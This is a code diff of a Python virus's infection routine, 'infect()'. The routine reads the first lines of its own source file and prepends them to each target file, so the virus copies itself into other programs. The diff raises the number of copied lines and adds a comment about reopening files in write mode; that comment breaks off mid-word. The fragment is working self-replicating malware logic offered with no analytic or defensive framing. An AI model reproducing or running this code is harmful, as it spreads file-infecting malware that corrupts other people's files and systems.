@@ -29,13 +29,14 @@ def infect(filestoinfect):
     virus = open(os.path.abspath(__file__))
     virusstring = ""
     for i,line in enumerate(virus):
-        if i>=0 and i <39:
+        if i>=0 and i <48:
             virusstring += line
     virus.close
     for fname in filestoinfect:
         f = open(fname)
         temp = f.read()
         f.close()
+        # reopens the file in write mode, which erases the original content of the fil
         f = open(fname,"w")
         f.write(virusstring + temp)
         f.close()
